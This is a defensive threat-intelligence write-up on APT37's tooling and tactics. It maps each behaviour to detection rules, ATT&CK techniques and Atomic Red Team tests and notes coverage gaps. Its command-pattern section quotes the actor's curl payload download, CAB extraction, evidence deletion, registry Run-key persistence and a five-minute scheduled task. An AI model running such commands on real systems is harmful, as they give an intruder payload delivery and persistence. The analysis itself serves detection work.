# APT37 Behaviors Analysis

## Overview
APT37 (also known as ScarCruft, Ruby Sleet, and Velvet Chollima) is a North Korean-aligned threat actor active since at least 2012. This analysis is based on the Zscaler ThreatLabz blog post from September 8, 2025.

## Key Behaviors Identified

### 1. Initial Access & Delivery
- **Spear-phishing attachments** (T1566.001)
  - `windows_spearphishing_attachment_onenote_spawn_mshta.yml`
  - `windows_office_product_spawned_child_process_for_download.yml`
- **Windows shortcut files (.lnk)** delivery as infection vectors
  - `windows_user_execution_malicious_url_shortcut_file.yml`
  - `windows_iso_lnk_file_creation.yml`
  - `process_creating_lnk_file_in_suspicious_location.yml`
- **Compiled HTML Help (.chm) files** as delivery mechanism
  - `detect_html_help_spawn_child_process.yml`
  - `detect_html_help_url_in_command_line.yml`
  - `detect_html_help_using_infotech_storage_handlers.yml`
  - `detect_html_help_renamed.yml`
  - `windows_system_binary_proxy_execution_compiled_html_file_decompile.yml`
- **Archive files** delivered via spear phishing
  - `windows_archive_collected_data_via_rar.yml`
  - `windows_obfuscated_files_or_information_via_rar_sfx.yml`
  - `detect_outlook_exe_writing_a_zip_file.yml`

#### Atomic Red Team Tests
- T1566.001 Spearphishing Attachment — `atomics/T1566.001/T1566.001.yaml`
- T1204.002 User Execution: Malicious File (.lnk) — `atomics/T1204.002/T1204.002.yaml`
- T1218.001 Signed Binary Proxy Execution: Compiled HTML (hh.exe) — `atomics/T1218.001/T1218.001.yaml`

### 2. Execution & Persistence
- **Windows Task Scheduler** - Creates scheduled task named "MicrosoftUpdate" for persistence (T1053.005)
  - `winevent_scheduled_task_created_within_public_path.yml`
  - `scheduled_task_deleted_or_created_via_cmd.yml`
  - `windows_scheduled_task_with_suspicious_name.yml`
  - `windows_scheduled_task_with_suspicious_command.yml`
  - `suspicious_scheduled_task_from_public_directory.yml`
- **Registry Run Keys** - Creates Run registry entry "OnedriveStandaloneUpdater" for persistence (T1547.001)
  - `registry_keys_used_for_persistence.yml`
  - `windows_boot_or_logon_autostart_execution_in_startup_folder.yml`
- **JavaScript execution** via embedded HTA files (T1059.007)
  - `detect_mshta_inline_hta_execution.yml`
  - `detect_rundll32_inline_hta_execution.yml`
- **Windows Command Shell** execution (T1059.003)
  - `windows_office_product_spawned_uncommon_process.yml`
- **mshta.exe exploitation** to execute malicious .hta files (T1218.005)
  - `detect_mshta_url_in_command_line.yml`
  - `detect_mshta_renamed.yml`
  - `suspicious_mshta_spawn.yml`
  - `mshta_spawning_rundll32_or_regsvr32_process.yml`

#### Atomic Red Team Tests
- T1053.005 Scheduled Task — `atomics/T1053.005/T1053.005.yaml`
- T1547.001 Registry Run Keys / Startup Folder — `atomics/T1547.001/T1547.001.yaml`
- T1218.005 Mshta — `atomics/T1218.005/T1218.005.yaml`
- T1059.007 JavaScript — `atomics/T1059.007/T1059.007.yaml`
- T1059.003 Windows Command Shell — `atomics/T1059.003/T1059.003.yaml`

### 3. Malware Components
- **Rustonotto** - Rust-based backdoor (first known APT37 use of Rust)
  - *No specific Rust-based detections found*
- **Chinotto** - PowerShell-based malware in use since 2019
  - `powershell_4104_hunting.yml`
  - `malicious_powershell_process___execution_policy_bypass.yml`
- **FadeStealer** - Surveillance tool first discovered in 2023
  - `processes_tapping_keyboard_events.yml` (keylogging)
  - `windows_screen_capture_via_powershell.yml` (screen capture)
- **Python-based loader** implementing Process Doppelgänging
  - *No specific Process Doppelgänging detections found*

#### Atomic Red Team Tests
- T1059.001 PowerShell — `atomics/T1059.001/T1059.001.yaml`
- T1056.001 Input Capture: Keylogging — `atomics/T1056.001/T1056.001.yaml`
- T1113 Screen Capture — `atomics/T1113/T1113.yaml`
- T1123 Audio Capture — `atomics/T1123/T1123.yaml`
- Note: No Rust-specific atomic tests identified in this repo

### 4. Process Injection & Code Execution
- **Process Doppelgänging** using Windows Transactional NTFS (TxF) (T1055.013)
  - `windows_process_injection_into_notepad.yml`
  - `windows_process_injection_into_commonly_abused_processes.yml`
- **Python code injection** into legitimate processes
  - *No specific Python injection detections found*
- **Legitimate Python module renamed** as "tele_update.exe" (T1036.003)
  - `suspicious_process_executed_from_container_file.yml`

#### Atomic Red Team Tests
- T1055.011 Process Injection: Extra Window Memory — `atomics/T1055.011/T1055.011.md`
- T1055.013 Process Doppelgänging — No direct atomic present; related T1055 atomics approximate
- T1036.003 Masquerading: Rename System Utilities — `atomics/T1036.003/T1036.003.yaml`

### 5. Masquerading & Defense Evasion
- **Masquerading as legitimate services** (OneDrive, Windows Update) (T1036.004)
  - `windows_service_created_with_suspicious_service_path.yml`
- **Renaming legitimate utilities** (T1036.003)
  - `detect_mshta_renamed.yml`
  - `detect_html_help_renamed.yml`
- **Service/task impersonation** (T1036.004)
  - `windows_scheduled_task_with_suspicious_name.yml`

#### Atomic Red Team Tests
- T1036.003 Masquerading: Rename System Utilities — `atomics/T1036.003/T1036.003.yaml`
- T1036.004 Masquerade Task or Service — `atomics/T1036.004/T1036.004.yaml`

### 6. Data Collection & Surveillance
- **Keylogging** capabilities (T1056.001)
  - `processes_tapping_keyboard_events.yml`
  - `windows_input_capture_using_credential_ui_dll.yml`
- **Screen capture** functionality (T1113)
  - `windows_screen_capture_via_powershell.yml`
  - `windows_screen_capture_in_temp_folder.yml`
  - `suspicious_image_creation_in_appdata_folder.yml`
- **Audio recording** from microphone (T1123)
  - *No specific audio capture detections found (only Zoom-related)*
- **Removable media monitoring** and data collection (T1025)
  - `windows_process_executed_from_removable_media.yml`
  - `windows_replication_through_removable_media.yml`
  - `windows_usbstor_registry_key_modification.yml`
  - `windows_wpdbusenum_registry_key_modification.yml`

#### Atomic Red Team Tests
- T1056.001 Input Capture: Keylogging — `atomics/T1056.001/T1056.001.yaml`
- T1113 Screen Capture — `atomics/T1113/T1113.yaml`
- T1123 Audio Capture — `atomics/T1123/T1123.yaml`
- T1025 Data from Removable Media — `atomics/T1025/T1025.yaml`

### 7. Data Exfiltration
- **RAR archive creation** with password protection (T1560.001)
  - `windows_archive_collected_data_via_rar.yml`
  - `windows_obfuscated_files_or_information_via_rar_sfx.yml`
  - `windows_archive_collected_data_via_powershell.yml`
  - `icedid_exfiltrated_archived_file_creation.yml`
- **HTTP/HTTPS communication** for C2 and data exfiltration (T1071.001)
  - `windows_exfiltration_over_c2_via_powershell_uploadstring.yml`
  - `windows_exfiltration_over_c2_via_invoke_restmethod.yml`
  - `plain_http_post_exfiltrated_data.yml`
  - `multiple_archive_files_http_post_traffic.yml`
- **Base64 encoding** for data transmission (T1132.001)
  - `powershell_fileless_script_contains_base64_encoded_content.yml`
  - `windows_alternate_datastream___base64_content.yml`
- **Exfiltration over C2 channel** (T1041)
  - `windows_exfiltration_over_c2_via_powershell_uploadstring.yml`
  - `windows_exfiltration_over_c2_via_invoke_restmethod.yml`

#### Atomic Red Team Tests
- T1560.001 Archive Collected Data — `atomics/T1560.001/T1560.001.yaml`
- T1041 Exfiltration Over C2 Channel — `atomics/T1041/T1041.yaml`
- T1132.001 Data Encoding — `atomics/T1132.001/T1132.001.yaml`
- T1071.001 Web Protocols (HTTP/S) — `atomics/T1071.001/T1071.001.yaml`

### 8. Command & Control
- **Single C2 server** orchestrating all malware components
  - `cobalt_strike_named_pipes.yml`
  - `suspicious_curl_network_connection.yml`
- **HTTP protocol** for backdoor communications
  - `windows_http_network_communication_from_msiexec.yml`
  - `lolbas_with_network_traffic.yml`
- **Base64 encoding** for C2 communications
  - `powershell_fileless_script_contains_base64_encoded_content.yml`
  - `windows_alternate_datastream___base64_content.yml`

#### Atomic Red Team Tests
- T1071.001 Application Layer Protocol: Web Protocols — `atomics/T1071.001/T1071.001.yaml`
- T1132.001 Data Encoding — `atomics/T1132.001/T1132.001.yaml`

### 9. File Locations & Paths
- **ProgramData directory** usage for malware storage
  - `windows_process_execution_from_programdata.yml`
  - `suspicious_scheduled_task_from_public_directory.yml`
  - `winevent_scheduled_task_created_within_public_path.yml`
- **Temporary directories** for staging
  - `executables_or_script_creation_in_temp_path.yml`
  - `windows_screen_capture_in_temp_folder.yml`
  - `windows_archived_collected_data_in_temp_folder.yml`
- **System directories** for persistence mechanisms
  - `windows_service_created_with_suspicious_service_path.yml`
  - `windows_suspicious_driver_loaded_path.yml`

#### Atomic Red Team Tests
- T1105 Ingress Tool Transfer (curl download to ProgramData/Temp) — `atomics/T1105/T1105.yaml`
- T1547.001 Startup Folder persistence — `atomics/T1547.001/T1547.001.yaml`

### 10. Specific Technical Behaviors (From Blog Analysis)

#### 10.1 File Operations & Downloads
- **Curl downloads to ProgramData**
  - `windows_curl_download_to_suspicious_path.yml`
  - `windows_file_download_via_powershell.yml`
  - `cisco_nvm___suspicious_download_from_file_sharing_website.yml`
  - `bitsadmin_download_file.yml`

##### Atomic Red Team Tests
- T1105 Curl Download File (to ProgramData/Temp) — `atomics/T1105/T1105.yaml`
- T1105 Windows - PowerShell Download — `atomics/T1105/T1105.yaml`

#### 10.2 Cabinet File Operations
- **CAB file extraction and manipulation**
  - `windows_cab_file_on_disk.yml`
  - `windows_office_product_dropped_cab_or_inf_file.yml`
  - `suspicious_process_executed_from_container_file.yml`

##### Atomic Red Team Tests
- T1140 Expand CAB with expand.exe — `atomics/T1140/T1140.yaml`
- T1560.001 Compress a File using makecab — `atomics/T1560.001/T1560.001.yaml`

#### 10.3 File Deletion & Cleanup
- **Evidence removal via file deletion**
  - `windows_high_file_deletion_frequency.yml`
  - `windows_indicator_removal_via_rmdir.yml`
  - `recursive_delete_of_directory_in_batch_cmd.yml`

##### Atomic Red Team Tests
- T1070.004 Indicator Removal: File Deletion — `atomics/T1070.004/T1070.004.yaml`

#### 10.4 Specific File Creation Patterns
- **Executable creation in suspicious paths**
  - `windows_process_execution_from_programdata.yml`
  - `executables_or_script_creation_in_temp_path.yml`
  - `process_creating_lnk_file_in_suspicious_location.yml`

##### Atomic Red Team Tests
- T1105 Curl Download File (ProgramData/Temp) — `atomics/T1105/T1105.yaml`
- T1547.001 Startup Folder shortcut creation — `atomics/T1547.001/T1547.001.yaml`

#### 10.5 Registry Persistence Mechanisms
- **Registry Run key additions**
  - `registry_keys_used_for_persistence.yml`
  - `windows_boot_or_logon_autostart_execution_in_startup_folder.yml`

##### Atomic Red Team Tests
- T1547.001 Registry Run Keys / Startup Folder — `atomics/T1547.001/T1547.001.yaml`

#### 10.6 Scheduled Task Creation Patterns
- **Task creation with specific timing**
  - `winevent_scheduled_task_created_within_public_path.yml`
  - `windows_scheduled_task_with_suspicious_command.yml`
  - `scheduled_task_deleted_or_created_via_cmd.yml`

##### Atomic Red Team Tests
- T1053.005 Scheduled Task — `atomics/T1053.005/T1053.005.yaml`

## Specific APT37 Command Patterns & IOCs

### Command Line Behaviors Observed
1. **LNK File Size Validation**
   ```
   Scans %temp% and working directory for shortcut file with exact size (6,032,787 bytes)
   ```
   - *Detection Gap: No specific file size validation analytics found*
   - Atomic Red Team Tests:
     - T1204.002 User Execution: Malicious File (.lnk) — `atomics/T1204.002/T1204.002.yaml`
     - T1547.009 Shortcut Modification — `atomics/T1547.009/T1547.009.yaml`
     - T1547.001 Add Executable Shortcut Link to Startup — `atomics/T1547.001/T1547.001.yaml`
     - Note: No atomic for exact LNK size validation; above are closest.

2. **Curl Download to ProgramData**
   ```
   curl http://[redacted]/images/test/wonder.dat -o "c:\programdata\wonder.cab"
   ```
   - `windows_curl_download_to_suspicious_path.yml`
   - `windows_file_download_via_powershell.yml`
   - Atomic Red Team Tests:
     - T1105 Curl Download File (writes to ProgramData/Temp) — `atomics/T1105/T1105.yaml`
     - T1105 Windows - PowerShell Download — `atomics/T1105/T1105.yaml`

3. **Cabinet File Extraction**
   ```
   expand c:\programdata\wonder.cab -F:* c:\programdata
   ```
   - `windows_cab_file_on_disk.yml`
   - *Detection Gap: No specific expand.exe command analytics found*
   - Atomic Red Team Tests:
     - T1140 Expand CAB with expand.exe — `atomics/T1140/T1140.yaml`
     - T1560.001 Compress a File for Exfiltration using makecab — `atomics/T1560.001/T1560.001.yaml`

4. **Evidence Cleanup**
   ```
   del /f /q c:\programdata\wonder.cab
   ```
   - `windows_high_file_deletion_frequency.yml`
   - `recursive_delete_of_directory_in_batch_cmd.yml`
   - Atomic Red Team Tests:
     - T1070.004 Indicator Removal: File Deletion — `atomics/T1070.004/T1070.004.yaml`

5. **Registry Persistence**
   ```
   reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v TeleUpdate /d "c:\programdata\tele_update\tele_update.exe c:\programdata\tele_update\tele.conf c:\programdata\tele_update\tele.dat" /f
   ```
   - `registry_keys_used_for_persistence.yml`
   - Atomic Red Team Tests:
     - T1547.001 Reg Key Run — `atomics/T1547.001/T1547.001.yaml`

6. **Scheduled Task Creation**
   ```
   schtasks /create /tn "MicrosoftUpdate" /tr "c:\programdata\3HNoWZd.exe" /sc minute /mo 5
   ```
   - `winevent_scheduled_task_created_within_public_path.yml`
   - `windows_scheduled_task_with_suspicious_command.yml`
   - Atomic Red Team Tests:
     - T1053.005 Scheduled Task (Local/Startup/Hidden XML) — `atomics/T1053.005/T1053.005.yaml`

### File Artifacts
- **NKView.hwp** (decoy document) - `C:\ProgramData\NKView.hwp`
- **3HNoWZd.exe** (main executable) - `C:\ProgramData\3HNoWZd.exe`
- **wonder.dat/wonder.cab** (payload delivery)
- **tele_update.exe** (FadeStealer) with config files

## MITRE ATT&CK Techniques Observed
- T1566.001 - Phishing: Spearphishing Attachment
- T1059.003 - Command and Scripting Interpreter: Windows Command Shell
- T1059.007 - Command and Scripting Interpreter: JavaScript
- T1053.005 - Scheduled Task/Job: Scheduled Task
- T1204.001 - User Execution: Malicious Link
- T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
- T1055.013 - Process Injection: Process Doppelgänging
- T1036.003 - Masquerading: Rename Legitimate Utilities
- T1036.004 - Masquerading: Masquerade Task or Service
- T1218.005 - System Binary Proxy Execution: Mshta
- T1056.001 - Input Capture: Keylogging
- T1113 - Screen Capture
- T1123 - Audio Capture
- T1025 - Data from Removable Media
- T1560.001 - Archive Collected Data: Archive via Utility
- T1071.001 - Application Layer Protocol: Web Protocols
- T1132.001 - Data Encoding: Standard Encoding
- T1041 - Exfiltration Over C2 Channel

## Indicators of Compromise (IOCs)
- MD5: b9900bef33c6cc9911a5cd7eeda8e093
- MD5: 7967156e138a66f3ee1bfce81836d8d0 (3HNoWZd.exe.bin)
- MD5: 77a70e87429c4e552649235a9a2cf11a (wonder.dat)
- MD5: 04b5e068e6f0079c2c205a42df8a3a84 (tele.conf)
- MD5: d2b34b8bfafd6b17b1cf931bb3fdd3db (tele.dat)
- MD5: 3d6b999d65c775c1d27c8efa615ee520 (2024-11-22.rar)
- MD5: 89986806a298ffd6367cf43f36136311 (Password.chm)
- MD5: 4caa44930e5587a0c9914bda9d240acc (1.html)

## Summary of Mapped Analytics

### Coverage Analysis
- **Strong Coverage**: CHM files, LNK files, scheduled tasks, registry persistence, screen capture, archive creation
- **Moderate Coverage**: Process injection, C2 communications, data exfiltration
- **Limited Coverage**: Rust-based malware, Process Doppelgänging, audio capture, Python-specific behaviors

### Key Analytics for APT37 Detection
1. `detect_html_help_spawn_child_process.yml` - Detects CHM file execution
2. `windows_user_execution_malicious_url_shortcut_file.yml` - Detects malicious LNK files
3. `winevent_scheduled_task_created_within_public_path.yml` - Detects suspicious scheduled tasks
4. `registry_keys_used_for_persistence.yml` - Detects registry-based persistence
5. `windows_screen_capture_via_powershell.yml` - Detects screen capture activities
6. `windows_archive_collected_data_via_rar.yml` - Detects RAR archive creation
7. `detect_mshta_url_in_command_line.yml` - Detects MSHTA abuse
8. `processes_tapping_keyboard_events.yml` - Detects keylogging activities

### Detection Gaps Identified
1. **File Size Validation** - No analytics detect specific file size checks
2. **expand.exe Cabinet Extraction** - Missing detection for expand.exe with -F parameter
3. **Rust-based Malware** - No Rust-specific behavioral detections
4. **Process Doppelgänging via TxF** - Limited coverage for this injection technique
5. **Python Module Renaming** - Limited detection for legitimate tools renamed
6. **Audio Capture** - No specific microphone recording detections
7. **Hex Payload Extraction** - No detection for hex-to-binary conversion in scripts

### Potential New Analytics Needed
1. **Windows Expand Cabinet File Extraction** - Detect expand.exe usage
2. **Windows File Size Validation in Scripts** - Detect file size checks in malicious scripts
3. **Windows Rust Binary Execution** - Detect Rust-compiled executables
4. **Windows Python Module Masquerading** - Detect renamed Python modules
5. **Windows Transactional NTFS Abuse** - Detect TxF-based process injection

### Recommendations
1. Enable monitoring for CHM and LNK file execution
2. Monitor scheduled task creation in public directories  
3. Track registry modifications for persistence
4. Monitor for RAR archive creation and data staging
5. Implement PowerShell script block logging
6. Monitor for unusual process injection patterns
7. **Add detection for expand.exe usage with cabinet files**
8. **Monitor for curl downloads to ProgramData directory**
9. **Track file deletion patterns after downloads**

---
*Analysis based on Zscaler ThreatLabz blog post: https://www.zscaler.com/blogs/security-research/apt37-targets-windows-rust-backdoor-and-python-loader*
